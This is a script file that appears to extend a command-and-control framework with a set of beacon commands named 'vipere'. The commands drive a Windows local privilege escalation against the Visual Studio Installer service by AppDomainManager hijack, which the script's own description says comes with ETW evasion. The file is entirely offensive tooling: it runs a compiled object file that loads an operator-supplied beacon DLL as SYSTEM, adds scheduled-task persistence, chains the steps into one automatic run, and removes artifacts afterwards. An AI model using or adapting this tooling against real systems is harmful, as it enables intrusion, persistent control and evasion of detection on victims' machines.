var metadata = {
    name: "vipere",
    description: "VS Installer LPE - AppDomainManager hijack + ETW evasion"
};

// --- CHECK ---
var cmd_check = ax.create_command("vipere-check", "Vipere - detect service + persistence state", "vipere-check");
cmd_check.setPreHook(function(id, cmdline, parsed_json) {
    let bof_path = ax.script_dir() + "dist/lpe_vs_bootstrap." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `runbof "${bof_path}" string:check`, "Vipere check");
});

// --- PREPARE ---
var cmd_prepare = ax.create_command("vipere-prepare", "Vipere - download VS Installer from microsoft.com", "vipere-prepare");
cmd_prepare.setPreHook(function(id, cmdline, parsed_json) {
    let bof_path = ax.script_dir() + "dist/lpe_vs_bootstrap." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `runbof "${bof_path}" string:prepare`, "Vipere prepare");
});

// --- EXPLOIT (AppDomainManager hijack on service) ---
var cmd_exploit = ax.create_command("vipere-exploit", "Vipere - AppDomainManager hijack service -> SYSTEM", "vipere-exploit <beacon.dll>");
cmd_exploit.addArgFile("beacon_dll", true);
cmd_exploit.setPreHook(function(id, cmdline, parsed_json) {
    let dll_b64 = parsed_json["beacon_dll"];
    let bof_path = ax.script_dir() + "dist/lpe_vs_bootstrap." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `runbof "${bof_path}" string:exploit base64:${dll_b64}`, "Vipere exploit");
});

// --- PERSIST (Scheduled Task + AppDomainManager) ---
var cmd_persist = ax.create_command("vipere-persist", "Vipere - scheduled task + AppDomainManager persistence", "vipere-persist <beacon.dll>");
cmd_persist.addArgFile("beacon_dll", true);
cmd_persist.setPreHook(function(id, cmdline, parsed_json) {
    let dll_b64 = parsed_json["beacon_dll"];
    let bof_path = ax.script_dir() + "dist/lpe_vs_bootstrap." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `runbof "${bof_path}" string:persist base64:${dll_b64}`, "Vipere persist");
});

// --- FULL (prepare + exploit + persist in one BOF call) ---
var cmd_full = ax.create_command("vipere-full", "Vipere - full auto: prepare + exploit + persist", "vipere-full <beacon.dll>");
cmd_full.addArgFile("beacon_dll", true);
cmd_full.setPreHook(function(id, cmdline, parsed_json) {
    let dll_b64 = parsed_json["beacon_dll"];
    let bof_path = ax.script_dir() + "dist/lpe_vs_bootstrap." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `runbof "${bof_path}" string:full base64:${dll_b64}`, "Vipere full");
});

// --- CLEANUP ---
var cmd_cleanup = ax.create_command("vipere-cleanup", "Vipere - stop service + remove all artifacts + restore originals", "vipere-cleanup");
cmd_cleanup.setPreHook(function(id, cmdline, parsed_json) {
    let bof_path = ax.script_dir() + "dist/lpe_vs_bootstrap." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `runbof "${bof_path}" string:cleanup`, "Vipere cleanup");
});

var group = ax.create_commands_group("vipere", [cmd_check, cmd_prepare, cmd_exploit, cmd_persist, cmd_full, cmd_cleanup]);
ax.register_commands_group(group, ["beacon"], ["windows"], []);
